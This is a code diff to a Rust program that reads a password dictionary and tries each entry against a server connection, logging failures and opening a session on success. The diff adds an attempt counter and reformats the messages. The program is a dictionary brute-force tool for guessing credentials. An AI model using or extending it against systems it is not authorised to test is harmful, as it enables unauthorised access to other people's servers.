@@ -35,32 +35,31 @@ async fn main() {
     match File::open(dict) {
         Ok(file) => {
             let reader = BufReader::new(file);
-
+            let mut attempts = 0;
             // TODO: Add multi threading support
             for line in reader.lines() {
-
-                   connect(server, line.unwrap().as_str()).await;
-
+                connect(server, line.unwrap().as_str(), &attempts).await;
+                attempts += 1;
             }
         }
         Err(e) => println!("{}", e)
     }
-
 }
 
-async fn connect(addr: &str, password: &str) {
+async fn connect(addr: &str, password: &str, attempts: &i32) {
     // Connect to server and try password
     match Connection::connect(addr, password).await {
         Ok(conn) => {
             // Connection established with correct password
-            println!("{}", style(format!("Connection established to {} using '{}' as password!",
-                                           addr, password)).green().bold());
+            println!("{} (Attempt {})", style(format!("Connection established to {} using '{}' as password! ", addr, password)).green().bold(), style(attempts).yellow().bold());
 
             handle_session(conn).await
-        },
+        }
         // Connection failed or password wrong (Auth!)
-        Err(e) => println!("{}", style(format!("Connection failed to {} using '{}' because of {:?} error!",
-                                               addr, password, e)).red()) // Used {:?} for their names. As example "Auth" instead of "authentication failed"
+        Err(e) => {
+            println!("{} (Attempt {})", style(format!("Connection failed to {} using '{}' because of {:?} error!",
+                                                      addr, password, e)).red(), style(attempts).green().bold());
+        } // Used {:?} for their names. As example "Auth" instead of "authentication failed"
     }
 }
 
